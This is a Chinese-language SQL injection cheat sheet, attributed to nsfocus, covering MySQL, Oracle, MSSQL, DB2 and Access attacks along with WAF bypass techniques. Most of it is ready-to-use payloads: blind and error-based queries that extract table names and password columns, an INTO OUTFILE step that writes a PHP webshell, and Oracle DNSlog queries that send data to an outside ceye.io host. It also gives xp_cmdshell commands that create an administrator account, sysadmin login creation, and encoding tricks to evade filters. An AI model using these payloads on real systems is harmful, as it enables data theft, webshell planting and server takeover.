[TOC]

# SQL注入进阶

from：nsfocus

---

### MySQL注入基础：

##### 手工注入：

- system_user()	系统用户名

- user()	用户名

- current_user	当前用户名

- session_user()	连接数据库的用户名

- database()	数据库名

- version()	数据库版本

- load_file()	读取本地文件的函数

- @@datadir	读取数据库的路径

- @@basedir	安装路径

- @@version_compile_os	操作系统

### Oracle注入基础：

工具：OracleGetshell

##### 手工注入：

- user()	当前用户

- all_users	所有用户表

- all_tables	当前用户可访问的所有表

- sys.v_$version	版本信息表（字段banner）

- sign()	根据某个值是0、正数、负数，分别返回0、1、-1

- decode(1=1,0,1,-1)	第一个参数为表达式，当表达式的值等于参数2时，该函数返回参数3，否则返回参数4

##### 报错注入常用方法：

- 函数报错、除零报错

##### 命令执行：

- 通过注入SYS.DBMS_EXPORT_EXTENSION函数，在Oracle上创建Java包LinxUtil，里面两个函数，runCMD用于执行系统命令，readFile用于读取文件。

### MSSQL注入基础：

##### 常用函数：

- 数据库表	master..syslogins, master..sysprocesses
- 列名	name, loginname
- 当前用户	user, system_user, suser_sname(), is_srvrolemember('sysadmin')
- 据库凭据	SELECT user, password FROM master.dbo.sysxlogins

##### 命令执行：

- 使用xp_cmdshell存储过程执行操作系统命令

##### 手工注入：

- 返回的是连接的数据库名

  and db_name()>0

- 作用是获取连接的用户名

  and user>0

- 将数据库备份到Web目录下面

  ;backup database 数据库名 to disk='C:\inetpub\wwwroot\1.db';-- 

- 显示SQL系统版本

  and 1=(select @@VERSION)或and 1=convert(int,@@version)-- 

- **判断xp_cmdshell扩展存储过程是否存在**

  and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE xtype='X' AND name='xp_cmdshell')

- 回复xp_cmdshell扩展存储的命令

  ;exec master.dbo.sp_addextendedproc 'xp_cmdshell', 'E:\inetput\web\xplog70.dll';-- 

### DB2注入基础：

##### 手工注入：

以下均是是整型的注入，采用二分法猜解

- 猜用户表数量：

  and 0<(SELECT count(NAME) FROM SYSIBM.SYSTABLES where CREATOR=USER)

- 猜表长度：

  and 3<(SELECT LENGTH(NAME) FROM SYSIBM.SYSTABLES where name not in('COLUMNS') fetch first 1 rows only)

- 猜表第一个字符ASCII码：

  and 3<(SELECT ASCII(SUBSTR(NAME,1,1)) FROM SYSIBM.SYSTABLES where name not in('COLUMNS')fetch first 1 rows only)

- 猜表内列名数量：

  and 1<(SELECT COUNT(COLNAME) FROM SYSCAT.columns where TABNAME='TABLE')

- 猜第一个列名的长度：

  and 1<(SELECT LENGTH(COLNAME) FROM SYSCAT.columns where TABNAME='TABLE' and colno=0)

- 猜第一个列名第一个字符的ASCII码

  and 1<(SELECT ASCII(SUBSTR(COLNAME,1,1)) FROM SYSCAT.columns where TABNAME='TABLE' and colno=0)

- 依ID排降序，猜第一个PASSWD的长度

  and 0<(SELECT LENGTH(PASSWD) FROM TABLE ORDER BY ID DESC FETCH FIRST 1 ROWS ONLY)

- 依ID排降序，猜第一个PASSWD第一个字符的ASCII码

  and 0<(SELECT ASCII(SUBSTR(PASSWD,1,1)) FROM TABLE ORDER BY ID DESC FETCH FIRST 1 ROWS ONLY)

- 猜第二个PASSWD第一个字符的ASCII码

  and 0<(SELECT ASCII(SUBSTR(PASSWD,1,1)) FROM TABLE where PASSWD not in('grou1') FETCH FIRST 1 ROWS ONLY)

### Access注入基础

需要盲猜表名列名

---

### MySQL注入进阶技巧

##### 一般盲注：

- 使用ascii：

  ```mysql
  and ascii(substr((select table_name from information_schema.tables where table_schema="库名" limit i,1),j,1))>猜的数--+
  其中 i 为第 i 个表；j 为 第 i 个表的第 j 个字母
  *substr(a,b,c)从b位置开始，截取字符串a的c长度。
  *mid(a,b,c)从b位置开始，截取a字符串的c位。
  
  left(database(),1)>'s'
  *left(a,b) a字符串的左起b位
  
  ord()同ascii()
  ```

- 使用正则表达式：

  ```mysql
  and 1=(select 1 from information_schema.tables where table_schema="库名" and table_name REGEXP '^[a-z]' limit 0,1)
  ```

##### 时间盲注：

- sleep()

  ```mysql
  if(ascii(substr(database(),1,1))>115,0,sleep(5))%23
  if判断语句，条件为假，执行sleep
  推荐使用sleep()
  ```

- benchmark()

  ```mysql
  union select if(substring(current,1,1)=char(119),benchmark(5000000,ENCODE('MSG','by 5 seconds')),null) FROM (select database() as current) as tb1;
  
  benchmark(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过实践长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的CPU资源。
  ```

##### Order by注入：

- 在SQL注入防御是参数化查询时可以用order by注入，order by后的asc、desc参数是无法参数化的，一些开发人员会使用拼接方法连接语句，产生注入点。

  ```mysql
  ASC, if((1=1),1,(select 1 from information_schema.tables))
  ```

##### 数据库版本：

- mysql5.0以后	information_schema库出现
- mysql5.1以后    udf导入xx\lib\plugin\目录下
- mysql5.x以后    system执行命令

##### 手工注入总结：

- 报错方法集合：

  - 经典的count(\*)、floor(rand(0)\*2)、group by

  ```mysql
  select 1,count(*),concat(0x7e,version(),0x7e,floor(rand(0)*2))x from information_schema.columns group by x
  或
  select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))
  大致上是说floor(rand(0)*2)会产生确定的011011序列，而group by工作时先创建一个虚拟表(可以认为是最终的查询结果表)，会产生错误的关键原因是当group by遇到虚拟表中不存在的值时，应该将该值插入同时count计数为1，但floor(rand(0)*2)会再运算一次（就是说如果虚拟表中没有floor(rand(0)*2)当前计算的值时，往虚拟表中插入的时候它还会计算一次）使用条件是查询表中至少得有3条记录。
  
  如果关键的表被禁用了，可以使用这种形式
  select count(*) from (select 1 union select null union select(!1) group by concat(version(),floor(rand(0)*2)))
  
  如果rand被禁用了可以使用用户变量来报错
  select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)
  ```

  - 其他报错

  ```mysql
  EXP溢出报错
  select exp(~(select * from(select user())a))	//double数值类型超出范围
  exp()为以e为底的对数函数；适用版本大于等于5.5.5小于5.6
  
  select !(select * from (select user())x) - ~0	//bigint超出范围
  ~0是对0逐位取反；适用版本大于等于5.5.5
  
  mysql重复特性
  select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x
  此处重复了version
  
  XPATH语法错误
  updatexml(XML_document, XPath_string, new_value);
  extractvalue(XML_document, XPath_string);
  ```

  |     参数     |                                       描述 |
  | :----------: | -----------------------------------------: |
  | XML_document | String格式，为XML文档对象的名称，文中为Doc |
  | XPath_string |                          Xpath格式的字符串 |
  |  new_value   |     String格式，替换查找到的符合条件的数据 |

- mysql读取写入文件

  必备条件：

  ​		读：file权限必备

  ​		写：1.绝对路径、2.union可以适用、3.可以使用""

  判断是否具有读写权限

  ​		and (select count(*) from mysql.user)>0/\*

  ​		and (select count(file_priv) from mysql.user)>0/\*

  写文件：

  ​		into outfile写文件

  ```mysql
  union select 1,2,3,char(10进制或16进制的一句话木马代码),5,6,7,8,9 into outfile 'D:\web\shell.php'/*
  
  union select 1,2,3,load_file('d:\web\shell.jpg'),5,6,7,8,9 into outfile 'D:\web\shell.php'/*
  ```

### Oracle注入进阶技巧

##### 一般盲注：

- 布尔型盲注：

  ```sql
  获取表的个数
  and (select count(table_name) from user_tables)>1-- 
  获取第一个表的表名长度
  and (select length(table_name) from user_tables where rownum=1)>1-- 
  获取第一个表的第一个字符的ASCII码值
  and ascii(substr((select table_name from user_tables where rownum=1),1,1))>80-- 
  ```

- DNSlog注入(要能访问外网)：

  ```sql
  UTL_HTTP.REQUEST型
  union select null,UTL_HTTP.REQUEST((select table_name from user_tables where rownum=1)||'.5nj58o.ceye.io'),null from dual -- 
  
  UTL_INADDR.GET_HOST_ADDRESS型
  union select null,UTL_INADDR.GET_HOST_ADDRESS((select table_name from user_tables where rownum=1)||'.5nj58o.ceye.io'),null from dual -- 
  ```

- 报错型盲注：

  ```sql
  and (select dbms_xdb_version.checkin((select banner from sys.V_$version where rownum=1)) from dual) is not null-- 
  
  and (select dbms_xdb_version.makeversioned((select banner from sys.V_$version where rownum=1)) from dual) is not null-- 
  
  and (select dbms_xdb_version.uncheckout((select banner from sys.V_$version where rownum=1)) from dual) is not null-- 
  
  and (select dbms_utility.sqlid_to_sqlhash((select banner from sys.V_$version where rownum=1)) from dual) is not null-- 
  
  and (select dbms_streams.get_information((select banner from sys.V_$version where rownum=1)) from dual) is not null-- 
  
  and (select dbms_xmlschema.generateschema((select banner from sys.V_$version where rownum=1)) from dual) is not null-- 
  
  and (select dbms_xmltranslations.extractxliff((select banner from sys.V_$version where rownum=1)) from dual) is not null-- 
  
  and 1=ordsys.ord_dicom.getmappingxpath((select banner from sys.v_$version where rownum=1),user,user)-- 
  
  and 1=utl_inaddr.get_host_name((select banner from sys.v_$version where rownum=1))-- 
  
  and 1=ctxsys.drithsx.sn(1,(select banner from sys.v_$version where rownum=1))-- 
  
  and (select upper(XMLType(chr(60)||chr(58)||(select banner from sys.v_$version where rownum=1)||chr(62))) from dual) is not null-- 
  ```

##### 时间盲注：

- DBMS_PIPE.RECEIVE_MESSAGE()函数

  **延时盲注dbms_lock_sleep()函数可以让一个过程休眠很多秒，但使用该函数存在许多限制。**

  **首先，不能直接将该函数注入子查询中，因为Oracle不支持堆叠查询。**

  **其次，只有数据库管理员才能使用dbms_lock包。**

  ```sql
  在Oracle PL/SQL中可以使用下面的指令以内联方式注入延迟：
  dbms_pipe.receive_message('RDS',10)
  dbms_pipe.receive_message()函数将为从RDS管道返回的数据等待10秒。默认情况下，允许以public权限执行该包
  dbms_lock_sleep()与之相反，它是一个可以用在SQL语句中的函数。
  
  or 1=dbms_pipe.receive_message('RDS',10)-- 
  and 1=dbms_pipe.receive_message('RDS',10)-- 
  ```

- decode()函数

  ```sql
  判断第一个表名的第一个字符
  and 1=(select decode(substr((select table_name from user_tables where rownum=1),1,1),'S',(select count(*) from all_objects),1) from dual)-- 
  由于使用了select count(*) from all_objects方法，因此该过程会严重影响到数据库性能，谨慎操作
  ```

##### 手工注入：

- 常用语句：

  ```sql
  当前用户：
  select user from dual
  
  列出所有用户：
  select username from all_users order by username
  
  列出数据库：
  select distinct owner from all_tables
  
  列出表名：
  select table_name from all_tables
  select owner,table_name from all_tables
  
  列出字段名：
  select column_name from all_tab_columns where table_name='tablename'
  select column_name from all_tab_columns where table_name='tablename' and owner='ownername'
  
  定位DB文件：
  select name from V$DATAFILE
  ```

### MSSQL注入进阶技巧

##### 手工注入总结：

```mssql
判断是否是MSSQL
and exists(select * from sysobjects)

判断某表是否存在..tableName为表名
and exists(select * from tableName)

MSSQL版本
and 1=(select @@VERSION)

当前数据库名
and 1=(select db_name())

本地服务名
and 1=(select @@servername)

判断是否是系统管理员
and 1=(select IS_SRVROLEMEMBER('sysadmin'))-- 

判断是否是库权限
and 1=(select IS_MEMBER('db_owner'))-- 
and 1=(select IS_MEMBER('public'))-- 

判断是否有库读取权限
and 1=(select HAS_DBACCESS('master'))


暴库名DBID为1，2，3...
and 1=(select name from master.dbo.sysdatabases where dbid=1)

是否支持多行
;declare @d int

判断XP_CMDSHELL是否存在
and 1=(select count(*) from master.dbo.sysobjects where xtype='X' and name='xp_cmdshell')


查看xp_regread扩展存储过程是不是已经被删除
and 1=(select count(*) from master.dbo.sysobjects where name='xp_regread')

添加和删除一个SA权限的用户test（需要SA权限）
exec master.dbo.sp_addlogin test,password
exec master.dbo.sp_addsrvrolemember test,sysadmin

停掉或激活某个服务（需要SA权限）
exec master..xp_servicecontrol 'stop','schedule'
exec master..xp_servicecontrol 'start','schedule'

爆网站目录
create table [dbo].[cyfd] ([gyfd][char](255));

DECLARE @result varchar(255) EXEC master.dbo.xp_regread 'HKEY_LOCAL_MACHINE', 'SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots', '/', @result output insert into 临时表 (临时字段名) values(@result);--

id=2;DECLARE @result varchar(255) EXEC master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots', '/', @result output insert into cyfd (gyfd) values(@result);--

and 1=(select count(*) from 临时表 where 临时字段名>1)
and 1=(select count(*) from cyfd where gyfd > 1)
这样IE报错,就把刚才插进去的Web路径的值报出来了
drop table cyfd;-- 删除临时表
```

##### 命令执行：

```mssql
用xp_cmdshell执行命令
;exec master..xp_cmdshell"net user name password /add"-- 
;exec master..xp_cmdshell"net localgroup name administrators /add"-- 
```

---

### 通用型WAF绕过思路

- URL编码

  注入语句全部URL编码

- Unicode编码

  un%u0069on sel%u0065ct pass f%u0072om admin li%u006dit 1

- 数据库的一些bypass

  mysql: 内联注释： select->/\*!select\*/这样写法

  用'?'、'+'、'/**/'、'()'代替空格： select?user?from?user?union?select(1),(2)

  MySQL不能select->sele/**/ct这么写，MSSQL松散型问题可以这样写

- GET参数SQL注入%0A换行污染绕过

  ?id=1%0Aunion%0Aselect 1,2,3,4

- MSSQL:

  - 用HEX绕过，一般的IDS都无法检测出来：

  0x730079007300610064006D0069006E00 = hex(sysadmin)

  0x640062005F006F0077006E0065007200 = hex(db_owner)

  - 运用注释语句绕过

    /**/代替空格、分割敏感词 U/\*\*/NION

- 复参数绕过

  asp的参数复用  &id=xx -> ,xx 这是asp的一个BUG。

  .asp?id=1 union select 1,2,3&id=4 from admin



​		php的变量覆盖绕过：

​		.php?id=0&id=7 and 1=2     //&id=0 -> &id=7 and 1=2并没有像asp那样有','出现

​		部分WAF允许变量覆盖，相同变量赋了不同的值，覆盖了WAF的cache，但是**后端会优先处理最先前的值**

- 异常Method绕过

  还有HTTP/1.0    HTTP/0.9

  绕过那种只针对某几种方法 比如GET、POST方法设置策略的WAF

- 冷门函数/标签绕过

- WAF规则、策略阶段的绕过

  - 关键字拆分

    exec('ma'+'ster..x'+'p_cm'+'dsh'+'ell "net user"')

  - 请求方法差异  GET->POST

  - HTTP版本 0.9    1.1

  - 编码绕过、chunked编码绕过、超大数据包绕过、分块传输绕过**（[协议未覆盖](https://m.freebuf.com/news/193659.html)）**